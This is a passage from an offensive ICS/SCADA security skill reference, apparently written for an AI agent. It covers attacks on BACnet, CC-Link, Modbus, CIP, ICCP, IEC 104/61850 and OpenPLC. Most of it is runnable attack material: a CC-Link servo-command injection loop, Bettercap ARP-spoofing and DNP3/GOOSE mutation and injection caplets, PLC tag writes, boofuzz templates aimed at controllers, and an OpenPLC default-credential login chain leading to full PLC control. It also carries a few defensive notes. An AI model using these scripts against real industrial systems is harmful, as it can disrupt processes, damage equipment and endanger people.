    session = Session(target=Target(connection=UDPSocketConnection("192.168.1.50", 47808)))

    s_initialize("bacnet_who_is")
    # BVLC header
    s_static("\x81\x0b\x00\x0c")  # BACnet/IP original-broadcast-npdu, length 12
    # NPDU
    s_byte(0x01, name="npdu_version")
    s_byte(0x04, name="npdu_control")
    # APDU
    s_byte(0x00, name="pdu_type")
    s_byte(0x08, name="service_choice", fuzz_values=range(0, 32))
    s_byte(0x00, name="invoke_id")

    session.connect(s_get("bacnet_who_is"))

    # Confirmed request: WriteProperty
    s_initialize("bacnet_write_property")
    s_static("\x81\x0a\x00\x18\x01\x04")  # BACnet/IP original-unicast-npdu
    s_byte(0x00, name="pdu_type")
    s_byte(0x0F, name="service_choice", fuzz_values=[0x0F, 0x08, 0x0A])  # write, whoIs, read
    s_byte(0x01, name="invoke_id")
    # Object identifier: type=analog-output(2), instance=1
    s_dword(0x20000001, endian=">", name="obj_id", fuzz_values=[0x20000001, 0x200000FF, 0xFFFFFFFF])
    # Property identifier: present-value=85
    s_byte(0x55, name="prop_id")

    session.connect(s_get("bacnet_write_property"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

---

## 13. CC-Link

CC-Link is a Japanese fieldbus originated by Mitsubishi. CC-Link IE is the Ethernet variant; CC-Link IE TSN adds Time-Sensitive Networking.

### 13.1 CC-Link Discovery

```bash
# CC-Link IE uses Ethertype 0x88E1
sudo tcpdump -i eth0 -w cclink.pcap ether proto 0x88e1

# Identify CC-Link IE devices
tshark -r cclink.pcap -Y cclink -T fields \
  -e eth.src -e eth.dst | sort | uniq -c

# Wireshark CC-Link IE dissector
wireshark -r cclink.pcap -Y cclink &
```

### 13.2 CC-Link IE TSN Injection

```python
#!/usr/bin/env python3
# cclink_inject.py - Inject CC-Link IE TSN cyclic data
# WARNING: This can damage equipment on the production line.
from scapy.all import Ether, Raw, sendp
import struct, time

def build_cclink_ie_frame(src_mac, cycle_data):
    """Build CC-Link IE TSN cyclic data frame."""
    dst = "03:00:00:00:00:01"  # CC-Link multicast
    eth = Ether(src=src_mac, dst=dst, type=0x88E1)
    # CC-Link IE header: message type, source/dest node, cycle info
    header = struct.pack(">HHHBBH",
        0x0100,         # message type
        0x0000,         # source network
        0x0001,         # destination node
        0x01,           # cycle counter
        0x00,           # flags
        len(cycle_data)
    )
    return eth / Raw(load=header + cycle_data)

if __name__ == "__main__":
    src = "00:11:22:33:44:55"
    cycle = 0
    while True:
        # Cyclic data: 4 bytes servo command + 4 bytes counter
        cycle_data = struct.pack("<II", 0x0000FFFF, cycle)
        frame = build_cclink_ie_frame(src, cycle_data)
        sendp(frame, iface="eth0", verbose=0)
        cycle = (cycle + 1) % 0xFFFFFFFF
        time.sleep(0.000125)  # 125us cycle
```

---

## 14. Modbus RTU and Modbus Plus

Modbus RTU is the serial variant of Modbus, running on RS-232/RS-485. Modbus Plus is a token-passing fieldbus by Modicon/Schneider.

### 14.1 Modbus RTU Discovery

```bash
# Modbus RTU runs on RS-485 at 9600-115200 bps
# CRC16 checksum, no authentication

# Capture Modbus RTU via serial tap
python3 -c "
import serial
s = serial.Serial('/dev/ttyUSB0', 9600, parity=serial.PARITY_EVEN)
while True:
    line = s.read(256)
    if line: print(line.hex())
"

# Send Modbus RTU read holding registers
python3 -c "
import serial
from pymodbus.client.serial import ModbusSerialClient
c = ModbusSerialClient('/dev/ttyUSB0', baudrate=9600, parity='E')
c.connect()
r = c.read_holding_registers(address=0, count=10, slave_id=1)
if r.isError(): print('Error:', r)
else: print('Registers:', r.registers)
c.close()
"
```

### 14.2 Modbus Plus

```bash
# Modbus Plus uses a proprietary token-passing protocol
# Physical layer: RS-485 twisted pair, 1Mbps
# No public Wireshark dissector (Schneider proprietary)

# Identification via Modbus Plus bridge
# (Requires Schneider Modbus Plus to Ethernet bridge or Quantum PLC)
nmap -p 502 -sV 192.168.1.0/24  # Find Modicon PLCs
```

---

## 15. EtherNet/IP CIP Deep

EtherNet/IP is a separate skill (`scada-ics-security`) covers basic CIP. This section covers deep CIP object model exploration.

### 15.1 CIP Object Model Enumeration

```python
#!/usr/bin/env python3
# cip_object_enum.py - Enumerate CIP object classes
import socket, struct

def get_attribute_list(target_ip, port, class_id, instance_id):
    """Get all attributes of a CIP object via Get_Attribute_List."""
    # EtherNet/IP encapsulation
    # SendRRData: command 0x006F
    # CIP path: class, instance, attribute
    pass  # Requires pycomm3 or cpppo library

if __name__ == "__main__":
    # Use pycomm3 library for actual testing
    print("pip install pycomm3")
    print("from pycomm3 import LogixDriver")
    print("with LogixDriver('192.168.1.10') as plc:")
    print("    print(plc.get_tag_list())")
```

```bash
# Install pycomm3
pip install pycomm3

# Enumerate tags on Allen-Bradley ControlLogix
python3 -c "
from pycomm3 import LogixDriver
with LogixDriver('192.168.1.10') as plc:
    tags = plc.get_tag_list()
    for t in tags[:20]:
        print(f'{t.tag_name}: {t.data_type}')
"

# Read a specific tag
python3 -c "
from pycomm3 import LogixDriver
with LogixDriver('192.168.1.10') as plc:
    val = plc.read('Program:MainProgram.Counter')
    print(val.value, val.status)
"

# Write a tag (lab only)
python3 -c "
from pycomm3 import LogixDriver
with LogixDriver('192.168.1.10') as plc:
    plc.write('Setpoint', 75.5)
"
```

### 15.2 CIP Vendor ID Lookup

```python
CIP_VENDORS = {
    0x0001: "Rockwell Automation/Allen-Bradley",
    0x0002: "Omron",
    0x0005: "Emerson Process Management",
    0x000A: "Siemens",
    0x000D: "Schneider Electric",
    0x0014: "Mitsubishi Electric",
    0x0017: "Yaskawa",
    0x001E: "Beckhoff",
    0x0039: "Phoenix Contact",
    0x005A: "B&R Industrial",
    0x00C5: "ABB",
    # Full list: http://www.odva.org
}

def lookup_vendor(vendor_id):
    """Look up vendor name by CIP vendor ID."""
    return CIP_VENDORS.get(vendor_id, f"Unknown ({hex(vendor_id)})")

if __name__ == "__main__":
    import sys
    vid = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x0001
    print(f"Vendor 0x{vid:04X}: {lookup_vendor(vid)}")
```

---

## 16. ICCP / TASE.2

ICCP (Inter-Control Center Communications Protocol) is used for inter-utility communication between power grid control centers. Also known as TASE.2.

### 16.1 ICCP Reconnaissance

```bash
# ICCP runs on TCP 102 (same as MMS - based on MMS)
nmap -p 102 -sV 192.168.1.0/24

# Distinguish ICCP from S7comm and IEC 61850 MMS
# ICCP uses specific application contexts (TASE.2)
tshark -r iccp.pcap -Y iccp -V

# Identify ICCP Bilateral Table (BLT) exchanges
tshark -i eth0 -Y "iccp && iccp.invokeID" -T fields \
  -e frame.time -e ip.src -e ip.dst -e iccp.invokeID
```

### 16.2 ICCP Inter-Utility Attacks

```python
#!/usr/bin/env python3
# iccp_attack.py - Conceptual ICCP attack scenarios
# ICCP attacks target inter-utility data exchange:
# 1. Spoof generation values (false MW readings)
# 2. Inject false breaker status to neighboring utility
# 3. Block bilateral table updates (DoS)

# ICCP uses MMS as transport; attacking ICCP requires MMS-level access
# Reference: SANS ICS Summit 2017 "When the Lights Go Out"

def build_iccp_value_transfer(domain_id, item_id, value):
    """Build ICCP value transfer (conceptual)."""
    # Real implementation requires full MMS ASN.1 PER encoding
    return f"Conceptual: write {value} to ICCP domain {domain_id}, item {item_id}"

if __name__ == "__main__":
    print(build_iccp_value_transfer("Utility1", "Generator.MW", 999.9))
```

---

## 17. MITM

Cross-protocol MITM with Ettercap and Bettercap.

### 17.1 ARP Poisoning for ICS MITM

```bash
# Bettercap ARP spoof + protocol-aware capture
sudo bettercap -iface eth0

# Inside bettercap:
set arp.spoof.targets 192.168.1.5 192.168.1.10
set arp.spoof.internal false
arp.spoof on

# Capture DNP3
set net.sniff.filter "tcp port 20000 or tcp port 2404 or tcp port 102 or udp port 47808"
net.sniff on

# Log all traffic to file
set net.sniff.output /tmp/ics_mitm_$(date +%Y%m%d).pcap
net.sniff on
```

### 17.2 Custom DNP3 Mutation Filter

```python
#!/usr/bin/env python3
# bettercap_dnp3_mutation.py - Custom caplet for DNP3 mutation
# Save as dnp3_mutation.cap, run with: bettercap -caplet dnp3_mutation.cap

CAPLET = """
# dnp3_mutation.cap - Bettercap caplet for DNP3 MITM
set arp.spoof.targets 192.168.1.5 192.168.1.10
set arp.spoof.internal false
arp.spoof on

# JavaScript to mutate DNP3 traffic
set https.proxy.script dnp3_mutation.js
set http.proxy.script dnp3_mutation.js

# Or use net.relay module for TCP manipulation
set net.relay.tcp.filter "tcp port 20000"
net.relay on

# Log all DNP3 operations
set net.sniff.filter "tcp port 20000"
set net.sniff.output /tmp/dnp3_mitm.pcap
net.sniff on
"""

with open("/tmp/dnp3_mutation.cap", "w") as f:
    f.write(CAPLET)
print("Caplet written to /tmp/dnp3_mutation.cap")
print("Run: sudo bettercap -iface eth0 -caplet /tmp/dnp3_mutation.cap")
```

### 17.3 Ettercap Custom ICS Filter

```ettercap
# ic104_filter.txt - Ettercap filter for IEC 60870-5-104
# Logs all command (ASDU type 45) frames
if (ip.proto == TCP && tcp.dst == 2404) {
    # Look for IEC 104 start byte 0x68
    if (search(DATA.data, "\x68")) {
        # Parse to find ASDU type
        # If type == 45 (single command), log
        if (search(DATA.data, "\x2D")) {  # 0x2D = 45 decimal
            log(DATA.data, "/tmp/iec104_commands.log");
            msg("[IEC 104] Command detected!\n");
        }
    }
}
```

```bash
etterfilter -o ic104_filter.ef ic104_filter.txt
sudo ettercap -T -M arp -F ic104_filter.ef /192.168.1.5// /192.168.1.10//
```

### 17.4 L2 Frame Injection for GOOSE/SV

```bash
# Bettercap can inject Layer-2 frames for GOOSE/SV attacks
# Use Go script (JavaScript) interface
sudo bettercap -iface eth0

# Caplet for GOOSE stNum attack
cat > /tmp/goose_attack.cap <<'EOF'
clear
set arp.spoof.targets 192.168.1.5
arp.spoof on

# Inject GOOSE every 1ms
set ticker.commands "goose_inject"
set ticker.period 1
ticker on
EOF

# Goose injection JavaScript
cat > /tmp/goose_inject.js <<'EOF'
function goose_inject() {
    // Build GOOSE frame
    var frame = "\x01\x0C\xCD\x01\x00\x01" +  // dst
                "\x00\x11\x22\x33\x44\x55" +  // src
                "\x88\xB8" +  // EtherType
                // ... rest of GOOSE PDU with elevated stNum
                "...";
    // Send via raw socket
    var raw = require('raw_socket');
    raw.send("eth0", frame);
}
EOF

sudo bettercap -iface eth0 -caplet /tmp/goose_attack.cap
```

---

## 18. Boofuzz

Boofuzz is a network protocol fuzzing framework forked from Sulley. Use it for protocol-aware fuzzing of ICS protocols.

### 18.1 Boofuzz Common Setup

```bash
# Install boofuzz
pip install boofuzz

# Verify
python3 -c "from boofuzz import *; print(s_initialize)"
```

### 18.2 Boofuzz DNP3 Template

```python
#!/usr/bin/env python3
# boofuzz_dnp3.py - Full DNP3 fuzz template
from boofuzz import *

def main():
    target = Target(connection=TCPSocketConnection("192.168.1.10", 20000))
    session = Session(target=target, sleep_time=0.1)

    s_initialize("dnp3_master_to_outstation")
    # DNP3 link layer
    s_static("\x05\x64")  # start bytes
    s_byte(0x05, name="length", fuzz_values=[1, 5, 10, 0xFF])
    s_byte(0x44, name="ctrl", fuzz_values=[0x00, 0x40, 0x44, 0xC4, 0xFF])
    s_word(0x000A, endian=">", name="dest", fuzz_values=[0, 10, 0xFFFF])
    s_word(0x0001, endian=">", name="source", fuzz_values=[0, 1, 0xFFFF])
    s_word(0x0000, endian=">", name="crc_link", fuzz_values=[0x0000, 0xFFFF])

    # Transport
    s_byte(0x00, name="transport", fuzz_values=[0x00, 0x80, 0xFF])

    # Application request
    s_byte(0xC1, name="app_ctrl", fuzz_values=[0x00, 0xC1, 0xFF])
    s_byte(0x01, name="fc", fuzz_values=range(0, 24))

    # Object header - fuzz type/qualifier/range
    s_byte(0x00, name="obj_type", fuzz_values=[0, 1, 2, 3, 4, 5, 10, 20, 30, 40, 50, 60, 0xFF])
    s_byte(0x06, name="qualifier", fuzz_values=[0, 0x06, 0x07, 0x08, 0x17, 0x28, 0xFF])
    s_word(0x0000, endian=">", name="range_start", fuzz_values=[0, 100, 0xFFFF])
    s_word(0x0064, endian=">", name="range_stop", fuzz_values=[0, 100, 0xFFFF])

    session.connect(s_get("dnp3_master_to_outstation"))

    # Also fuzz as outstation-to-master response
    s_initialize("dnp3_outstation_to_master")
    s_static("\x05\x64")
    s_byte(0x05, name="length")
    s_byte(0x00, name="ctrl", fuzz_values=[0x00, 0x40, 0x44, 0xC4])
    s_word(0x0001, endian=">", name="dest")
    s_word(0x000A, endian=">", name="source")
    s_word(0x0000, endian=">", name="crc_link")
    s_byte(0x00, name="transport")
    s_byte(0x81, name="app_ctrl")  # response bit set
    s_byte(0x81, name="fc", fuzz_values=[0x80, 0x81, 0x82, 0xFF])

    session.connect(s_get("dnp3_outstation_to_master"))

    session.fuzz()

if __name__ == "__main__":
    main()
```

### 18.3 Boofuzz IEC 104 Template

```python
#!/usr/bin/env python3
# boofuzz_iec104.py - IEC 60870-5-104 fuzz template
from boofuzz import *

def main():
    session = Session(target=Target(connection=TCPSocketConnection("192.168.1.10", 2404)))

    # I-frame with fuzzed ASDU
    s_initialize("i_frame_command")
    s_static("\x68")
    s_byte(0x0E, name="len")
    s_word(0x0002, endian="<", name="send_seq")
    s_word(0x0000, endian="<", name="recv_seq")

    # ASDU
    s_byte(45, name="type_id", fuzz_values=[0, 1, 45, 46, 100, 103, 255])
    s_byte(0x01, name="struct_qual")
    s_byte(0x06, name="cause_low", fuzz_values=[0, 6, 7, 10, 0xFF])
    s_byte(0x00, name="cause_high")
    s_word(0x0001, endian="<", name="common_addr", fuzz_values=[0, 1, 0xFFFF])
    s_word(0x0064, endian="<", name="ioa_low", fuzz_values=[0, 100, 0xFFFF])
    s_byte(0x00, name="ioa_high")
    s_byte(0x01, name="scs")
    s_byte(0x00, name="sco", fuzz_values=range(0, 256))

    session.connect(s_get("i_frame_command"))

    # S-frame (supervisory) fuzz
    s_initialize("s_frame")
    s_static("\x68\x04")
    s_byte(0x01, name="type", fuzz_values=[0x01, 0x03, 0x05, 0x07, 0xFF])
    s_byte(0x00, name="reserved")
    s_word(0x0000, endian="<", name="recv_seq")

    session.connect(s_get("s_frame"))

    session.fuzz()

if __name__ == "__main__":
    main()
```

### 18.4 Boofuzz GOOSE Template

```python
#!/usr/bin/env python3
# boofuzz_goose.py - GOOSE fuzz template (Layer 2)
from boofuzz import *
from scapy.all import Ether

def main():
    # Boofuzz doesn't natively support Layer 2 - use Scapy + custom
    # Alternative: use Scapy directly with random mutation
    from scapy.all import Raw, sendp, Ether
    import random

    base_frame = (
        Ether(src="00:11:22:33:44:55", dst="01:0C:CD:01:00:01", type=0x88B8) /
        Raw(load=b'\x61\x82\x00\x26' +
            b'\x80\x0CLD0/LLN0$gocb1' +
            b'\x81\x02\x03\xE8' +
            b'\x82\x0ELD0/LLN0$dataset1')
    )

    print("[*] Fuzzing GOOSE...")
    for i in range(1000):
        # Mutate random bytes in payload
        payload = bytearray(bytes(base_frame[Raw]))
        for _ in range(random.randint(1, 5)):
            pos = random.randint(0, len(payload) - 1)
            payload[pos] = random.randint(0, 255)
        mutated = Ether(src="00:11:22:33:44:55", dst="01:0C:CD:01:00:01", type=0x88B8) / Raw(load=bytes(payload))
        sendp(mutated, iface="eth0", verbose=0)
        if i % 100 == 0:
            print(f"[*] Iteration {i}")

if __name__ == "__main__":
    main()
```

### 18.5 Boofuzz Modbus TCP Template

```python
#!/usr/bin/env python3
# boofuzz_modbus.py - Modbus TCP fuzz template
from boofuzz import *

def main():
    session = Session(target=Target(connection=TCPSocketConnection("192.168.1.10", 502)))

    s_initialize("modbus_request")
    # MBAP header
    s_word(0x0001, endian=">", name="trans_id")
    s_word(0x0000, endian=">", name="proto_id")  # 0 = Modbus
    s_word(0x0006, endian=">", name="length", fuzz_values=[0, 6, 0xFFFF])
    s_byte(0x01, name="unit_id", fuzz_values=range(0, 248))

    # PDU
    s_byte(0x03, name="fc", fuzz_values=[1, 2, 3, 4, 5, 6, 15, 16, 43, 0x80, 0xFF])
    s_word(0x0000, endian=">", name="start_addr", fuzz_values=[0, 100, 0xFFFF])
    s_word(0x000A, endian=">", name="quantity", fuzz_values=[0, 10, 125, 0xFFFF])

    session.connect(s_get("modbus_request"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

### 18.6 Boofuzz S7comm Template

```python
#!/usr/bin/env python3
# boofuzz_s7comm.py - S7comm fuzz template
from boofuzz import *

def main():
    session = Session(target=Target(connection=TCPSocketConnection("192.168.1.20", 102)))

    s_initialize("s7_setup_communication")
    # TPKT: 0x03, len, len
    s_static("\x03\x00\x00\x16")
    # COTP CR
    s_static("\x11\xE0\x00\x00\x00\x00\x00\xC0\x01\x0A\xC1\x02\x01\x00\xC2\x02\x01\x02")

    session.connect(s_get("s7_setup_communication"))

    # S7 message
    s_initialize("s7_request")
    # TPKT
    s_static("\x03\x00\x00\x1F")
    # COTP DT
    s_static("\x02\xF0\x80")
    # S7 header
    s_byte(0x32, name="proto_id")  # 0x32 = S7comm
    s_byte(0x01, name="msg_type", fuzz_values=[0x01, 0x02, 0x03, 0x07])
    s_word(0x0000, endian=">", name="red_id")
    s_word(0x0000, endian=">", name="pdu_ref")
    s_word(0x0008, endian=">", name="param_len")
    s_word(0x0000, endian=">", name="data_len")

    # Parameter
    s_byte(0x04, name="param_head", fuzz_values=[0x04, 0x05, 0x1A, 0x28])
    s_byte(0x01, name="param_len_bytes")
    s_byte(0x12, name="syntax_id")
    s_byte(0x0A, name="transport_size")
    s_word(0x0000, endian=">", name="req_data_size")

    session.connect(s_get("s7_setup_communication"), s_get("s7_request"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

---

## 19. Wireshark

Wireshark display filters for fieldbus protocols.

### 19.1 Display Filters by Protocol

```
# DNP3
dnp3
dnp3.app.funcCode == 5        # Direct Operate
dnp3.app.funcCode == 4        # Operate
dnp3.app.funcCode == 1        # Read
dnp3.app.funcCode == 13       # Cold Restart
dnp3.al.notDir == 0           # Outstation to master

# IEC 60870-5-104
iec60870_104
iec60870_104.typeid == 45     # Single command
iec60870_104.typeid == 100    # Interrogation
iec60870_104.causetx == 6     # Activation
iec60870_asdu.typeid == 45    # Generic ASDU filter

# IEC 61850 GOOSE
iecgoose
iecgoose.stNum > 100
iecgoose.simulation == 1

# IEC 61850 SV
iecsv
iecsv.smpCnt > 0

# IEC 61850 MMS
mms
mms.invokeID == 1

# PROFINET
pn_dcp
pn_rt
pn_mrp
pn_io

# EtherCAT
ecat
ecat.cmd == 0x0A    # APRD
ecat.cmd == 0x0B    # APWR

# BACnet
bacnet
bacnet.apdu.serviceChoice == 12   # ReadProperty
bacnet.apdu.serviceChoice == 15   # WriteProperty

# Modbus
modbus
modbus.func_code == 16    # Write Multiple Registers
modbus.func_code == 6     # Write Single Register

# CIP / EtherNet/IP
enip
cip
cip.cls == 0x01           # Identity Object

# Foundation Fieldbus
ff
ff_h1

# HART
hart_ip
hart
```

### 19.2 Combined ICS Filter

```
# Capture all ICS protocols at once
dnp3 || iec60870_104 || iecgoose || iecsv || mms || pn_rt || pn_dcp || ecat || bacnet || modbus || enip || ff || hart

# ICS command operations only
dnp3.app.funcCode == 5 || iec60870_asdu.typeid == 45 || bacnet.apdu.serviceChoice == 15 || modbus.func_code == 16

# Anomalous traffic patterns
dnp3.al.linkReset || iec60870_104.typeid > 127 || modbus.func_code > 0x80
```

### 19.3 Statistics and Analysis

```bash
# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Conversations by protocol
tshark -r capture.pcap -q -z conv,tcp

# Endpoint statistics
tshark -r capture.pcap -q -z endpoints,ip

# DNP3 function code distribution
tshark -r capture.pcap -Y dnp3 -T fields -e dnp3.app.funcCode | sort | uniq -c | sort -rn

# IEC 104 ASDU type distribution
tshark -r capture.pcap -Y iec60870_asdu -T fields -e iec60870_asdu.typeid | sort | uniq -c

# GOOSE publisher list
tshark -r capture.pcap -Y iecgoose -T fields -e eth.src -e iecgoose.goIDref | sort -u

# Per-second ICS frame rate
tshark -r capture.pcap -Y "dnp3 || iec60870_104 || iecgoose" -T fields -e frame.time_relative | \
  awk '{ts=int($1); count[ts]++} END {for (t in count) print t": "count[t]" fps"}'
```

---

## 20. Scapy

Reference for Scapy layers relevant to ICS protocols.

### 20.1 Scapy Layer Import

```python
#!/usr/bin/env python3
# scapy_ics_layers.py - Scapy ICS layer imports

# Built-in Scapy (>= 2.4)
from scapy.all import Ether, IP, TCP, UDP, Raw, sendp, srp, sniff, conf
from scapy.layers.l2 import ARP

# Contrib layers (built into Scapy)
from scapy.contrib.dnp3 import DNP3, DNP3LinkLayer, DNP3Transport
from scapy.contrib.modbus import ModbusTCP, ModbusADURequest
from scapy.contrib.bacnet import Bvlc, NPDU

# Community-provided ICS layers (may need separate install)
# pip install scapy-iec61850 (community)
# pip install scapy-ethercat (community)
# pip install scapy-profinet (community)
```

### 20.2 Scapy DNP3 Layer

```python
#!/usr/bin/env python3
# scapy_dnp3_examples.py
from scapy.all import IP, TCP, send
from scapy.contrib.dnp3 import DNP3

def build_dnp3_read():
    """Build a DNP3 read request using Scapy contrib layer."""
    # Note: Scapy's DNP3 layer may be incomplete; for production use
    # custom implementations or pydnp3 library
    p = (
        IP(dst="192.168.1.10") /
        TCP(dport=20000, sport=12345) /
        DNP3()
    )
    p.show()
    return p

if __name__ == "__main__":
    p = build_dnp3_read()
    # Scapy's TCP layer doesn't auto-handshake; use real TCP socket
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.10", 20000))
    s.send(bytes(p[TCP].payload))
    print(s.recv(4096).hex())
```

### 20.3 Custom GOOSE Layer

```python
#!/usr/bin/env python3
# scapy_goose.py - Custom GOOSE layer for Scapy
# (Since Scapy's contrib doesn't have full IEC 61850 GOOSE support)
from scapy.all import Ether, Raw, bind_layers
from scapy.fields import *

class GOOSE(Packet):
    """Custom IEC 61850 GOOSE layer."""
    name = "GOOSE"
    fields_desc = [
        # EtherType handled by Ether layer
        # APPID
        ShortField("appid", 0x0001),
        ShortField("length", 0),
        IntField("reserved1", 0),
        IntField("reserved2", 0),
        # PDU (ASN.1 BER) - simplified
        StrField("pdu", b"", fmt="H"),
    ]

bind_layers(Ether, GOOSE, type=0x88B8)

if __name__ == "__main__":
    # Test the layer
    p = Ether(src="00:11:22:33:44:55", dst="01:0C:CD:01:00:01") / \
        GOOSE(appid=0x0001, length=50, reserved1=0, reserved2=0, pdu=b'\x61\x82\x00\x26')
    p.show()
    print(f"Bytes: {bytes(p).hex()}")
```

### 20.4 Custom EtherCAT Layer

```python
#!/usr/bin/env python3
# scapy_ethercat.py - Custom EtherCAT layer
from scapy.all import Ether, Raw, bind_layers, Packet
from scapy.fields import *

class EtherCAT(Packet):
    """Custom EtherCAT layer."""
    name = "EtherCAT"
    fields_desc = [
        # Header: length (11 bits) + reserved (1 bit) + type (4 bits)
        BitField("length", 0, 11),
        BitField("reserved", 0, 1),
        BitField("type", 4, 4),
        # Datagram(s) follow
        StrField("datagrams", b"", fmt="H"),
    ]

bind_layers(Ether, EtherCAT, type=0x88A4)

if __name__ == "__main__":
    p = Ether(src="00:11:22:33:44:55", dst="AA:BB:CC:DD:EE:FF") / \
        EtherCAT(length=44, type=0x04, datagrams=b'\x0A\x01\x00\x01\x00\x00\x00\x00')
    p.show()
```

### 20.5 Scapy PROFINET Layer

```python
#!/usr/bin/env python3
# scapy_profinet.py - Custom PROFINET DCP layer
from scapy.all import Ether, bind_layers, Packet, ShortEnumField
from scapy.fields import *

class ProfinetDCP(Packet):
    """PROFINET DCP (Discovery and Configuration Protocol)."""
    name = "ProfinetDCP"
    fields_desc = [
        ShortField("frame_id", 0xFEFF),  # 0xFEFF = Identify Multicast
        ByteField("service_id", 0x05),
        BitField("service_type", 0, 4),
        BitField("reserved", 0, 4),
        IntField("xid", 0),
        ShortField("response_delay", 0),
        ShortField("dcp_data_length", 0),
    ]

bind_layers(Ether, ProfinetDCP, type=0x8892)

if __name__ == "__main__":
    p = Ether(src="00:11:22:33:44:55", dst="01:0E:CF:00:00:00") / \
        ProfinetDCP(frame_id=0xFEFF, service_id=0x05, service_type=0, xid=1, response_delay=0, dcp_data_length=2)
    p.show()
```

---

## Reference: Quick Command Cheat Sheet

```bash
# === Discovery ===
nmap -p 502,102,2404,44818,47808,20000 -sV 192.168.1.0/24
masscan 192.168.1.0/24 -p502,102,44818,20000,2404 --rate=1000

# === DNP3 ===
nmap -p 20000 --script dnp3-info <target>
master -c master.config --read class-0
master -c master.config --command binary-output 1:1 --function direct-operate

# === IEC 104 ===
nmap -p 2404 -sV <target>
iec104_test_client -h <target> -p 2404 --interrogation
iec104_test_client -h <target> -p 2404 --command single 100 1

# === IEC 61850 ===
iec61850_client_example <target> 102
iec61850_client_example <target> 102 read LD0/LLN0.Mod.stVal
iec61850_client_example <target> 102 write LD0/CSWI1.Pos.Oper.ctlVal 1

# === GOOSE ===
tshark -i eth0 -Y iecgoose -T fields -e eth.src | sort -u
python3 inject_goose.py --interface eth0 --stnum 99999

# === PROFINET ===
nmap --script broadcast-pn-dcp-identify -e eth0
tshark -i eth0 -Y pn_dcp -T fields -e pn_dcp.nameOfStation

# === BACnet ===
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24
bacnetread -d 192.168.1.50 -t device,100 -p object-list
bacnetwrite -d 192.168.1.50 -t analogOutput,1 -p present-value -v 75.5

# === CIP / EtherNet/IP ===
nmap -p 44818 --script enip-info <target>
python3 -c "from pycomm3 import LogixDriver; \
  with LogixDriver('192.168.1.10') as plc: print(plc.get_tag_list())"

# === Fuzzing ===
python3 fuzz_dnp3.py --target 192.168.1.10:20000
python3 fuzz_iec104.py --target 192.168.1.10:2404
python3 fuzz_goose.py --interface eth0
python3 fuzz_modbus.py --target 192.168.1.10:502

# === MITM ===
sudo bettercap -iface eth0
# Inside bettercap:
# set arp.spoof.targets 192.168.1.5 192.168.1.10
# arp.spoof on
# net.sniff on

# === Honeypot ===
conpot -f --template iec104_honeypot -l /var/log/conpot.log

# === Wireshark ===
tshark -i eth0 -Y "dnp3 || iec60870_104 || iecgoose || iecsv || pn_dcp || ecat || bacnet || modbus"
```

---

## 21. OpenPLC Web HMI + Modbus TCP 实战发现

> **来源**：v0.2.5.1 实战验证（2026-08-10）— 针对 GRFICSv3 OpenPLC 容器（真实 OpenPLC v3 + Werkzeug 2.3.7 + Python 3.9.2）
> **验证指南**：见 `guides/validation-walkthrough-zh.md`
> **适用场景**：OpenPLC 部署 / 同类 Web HMI + Modbus TCP PLC 架构

### 21.1 OpenPLC Web HMI 默认凭据（F-008 P0）

**实证发现**：OpenPLC Web HMI 默认凭据 `openplc:openplc`，可直接登录 `/dashboard`。

```bash
# 测试多个常见凭据组合（仅 openplc:openplc 成功）
for cred in admin:admin admin:openplc openplc:openplc admin:password; do
  user="${cred%:*}"; pass="${cred#*:}"
  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
    --max-time 3 -X POST http://target:8080/login \
    -d "username=$user&password=$pass")
  echo "  $user/$pass: $result"
done
# 预期：openplc:openplc → 302 → /dashboard（其余 200 停留在 login）
```

**完整利用链**（登录后获取 runtime 控制权）：
```bash
# 1. 登录获取 cookie
curl -c cookies.txt -X POST http://target:8080/login \
  -d "username=openplc&password=openplc"

# 2. 用 cookie 访问 dashboard → 上传/启动 ST 程序 → 完全 PLC 控制
curl -b cookies.txt http://target:8080/dashboard
curl -b cookies.txt http://target:8080/modbus  # Modbus 配置页
```

**防御建议**：安装后立即改默认密码；限制 8080 端口仅工程师站访问；启用反爆破。

### 21.2 nmap modbus-discover 真实行为（F-009 P1）

**SKILL 原文**（line 40 等）暗示 `nmap --script modbus-discover` 返回设备识别信息。

**真实行为**（OpenPLC + 多数现代 PLC）：返回 `ILLEGAL FUNCTION`，因为目标拒绝 FC 0x2B（Read Device Identification）。

```bash
nmap --script modbus-discover -p 502 target
# 实际输出：
# | modbus-discover:
# |   sid 0x1:
# |_    error: ILLEGAL FUNCTION
```

**SKILL 修正指引**：
- `ILLEGAL FUNCTION` 不算失败 — 反而确认目标是 Modbus 设备但拒绝该 FC
- 真实生产 PLC 中，施耐德 Modicon M340、ABB AC500、西门子 S7-1500（经 Modbus TCP 网关）多数拒绝 FC 0x2B
- **可靠替代**：依赖 `nmap -sV` 的服务版本指纹 + Modbus MBAP banner

### 21.3 Modbus HR 0xFFFF 内存泄漏模式（F-010 P2）

**模式**：未初始化的 ST 程序变量在 Modbus HR 中以 0xFFFF（65535）暴露。

```python
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='target', port=502, timeout=5)
c.open()
# 读 HR 0-50，找非零且 = 65535 的位置
hr = c.read_holding_registers(0, 50)
leak_positions = [(i, v) for i, v in enumerate(hr) if v == 0xFFFF]
print(f"Memory leak indicators: {leak_positions}")
# OpenPLC 实证：HR[12] = 65535, HR[13] = 65535
# 对应 ST 程序变量：purge_manual_sp, product_manual_sp（未初始化的 UINT）
c.close()
```

**漏洞机制**：OpenPLC ST runtime 编译时未清零 %QW 映射区，0xFFFF 是 UINT 默认值；远程匿名读取即可洞察内部状态。

**防御建议**：在 ST 程序 VAR_BLOCK 显式初始化所有 UINT 为 0；启用 OpenPLC 的"安全模式"（如有）。

### 21.4 Werkzeug + Python 版本指纹（F-011 P3）

**实证**：nmap -sV 直接披露 OpenPLC Web HMI 的 Werkzeug + Python 版本。

```bash
nmap -p 8080 -sV target
# 输出含：8080/tcp open http Werkzeug httpd 2.3.7 (Python 3.9.2)
```

**利用价值**：
- Werkzeug 2.3.7 已知 CVE-2023-46136（DoS via multipart）
- Python 3.9.2 EOL（2025-10），不再接收安全补丁
- 锁定版本后可针对性查 NVD

